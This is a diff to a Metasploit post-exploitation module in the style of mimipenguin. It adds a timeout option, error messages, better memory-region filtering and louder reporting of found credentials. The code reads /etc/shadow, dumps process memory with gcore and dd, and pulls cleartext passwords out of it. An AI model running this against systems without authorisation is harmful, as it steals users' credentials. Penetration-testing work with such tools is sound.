@@ -46,8 +46,13 @@ class MetasploitModule < Msf::Post
       'SessionTypes'  => ['shell', 'meterpreter'],
       'References'    => [['URL', 'https://github.com/huntergregal/mimipenguin']]))
     register_options [
-      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
+      OptInt.new('TIMEOUT', [ true, 'Timeout for dumping each memory region (seconds)', '60' ])
     ]
+  end
+
+  def timeout
+    datastore['TIMEOUT'].to_i
   end
 
   def base_dir
@@ -63,6 +68,7 @@ class MetasploitModule < Msf::Post
     shadow = read_file '/etc/shadow' || ''
     shadow.each_line do |line|
       user, hash = line.split(':')[0..1]
+      next if user.eql? ''
       next if hash.eql? '*'
       next if hash.start_with? '!'
       hashes << { user: user, hash: hash }
@@ -87,9 +93,10 @@ class MetasploitModule < Msf::Post
   # Dump process memory with gcore
   #
   def dump_mem_gcore(pid, dumpfile)
-    res = cmd_exec "gcore -o '#{dumpfile}' #{pid}", nil, 60
+    res = cmd_exec "gcore -o '#{dumpfile}' #{pid}", nil, timeout
     res.include? 'Saved corefile'
-  rescue
+  rescue => e
+    print_error "Something went wrong dumping process memory: #{e.message}"
     false
   end
 
@@ -97,7 +104,8 @@ class MetasploitModule < Msf::Post
   # Dump process memory with dd
   #
   def dump_mem_dd(pid, dumpfile)
-    mem_maps = cmd_exec("grep -E '^[0-9a-f-]* r' /proc/#{pid}/maps | cut -d' ' -f 1").to_s.chomp
+    # retrieve +pid+ memory regions, ignoring memory mapped from files
+    mem_maps = cmd_exec("grep -E '^[0-9a-f-]* r' /proc/#{pid}/maps | grep -E -v 'lib|usr|bin' | cut -d' ' -f 1").to_s.chomp
     mem_maps.each_line do |line|
       memrange_start = line.chomp.split('-')[0].to_i(16)
       memrange_stop = line.chomp.split('-')[1].to_i(16)
@@ -109,10 +117,11 @@ class MetasploitModule < Msf::Post
       cmd = "dd if=/proc/#{pid}/mem of=\"#{dumpfile}.#{pid}\""
       cmd += " ibs=1 oflag=append conv=notrunc skip=\"#{memrange_start}\" count=\"#{memrange_size}\""
       cmd += " > /dev/null 2>&1"
-      cmd_exec cmd
+      cmd_exec cmd, nil, timeout
     end
     true
-  rescue
+  rescue => e
+    print_error "Something went wrong dumping process memory: #{e.message}"
     false
   end
 
@@ -204,7 +213,7 @@ class MetasploitModule < Msf::Post
           vprint_status "Found #{app} process ID: #{pid}"
           search_mem(pid, process[:needles]).each do |password|
             check_valid_password(password).each do |user|
-              vprint_good "[#{app}] Found credentials: #{user}:#{password}"
+              print_good "[#{app}] Found credentials: #{user}:#{password}"
               creds << [app, user, password]
               store_valid_credential user: user, private: password, proof: app
             end
@@ -220,7 +229,7 @@ class MetasploitModule < Msf::Post
 
     creds.uniq!
 
-    vprint_good "Found #{creds.size} credentials"
+    print_good "Found #{creds.size} credentials"
     table = Rex::Text::Table.new(
       'Header'    => 'Credentials',
       'Indent'    => 2,
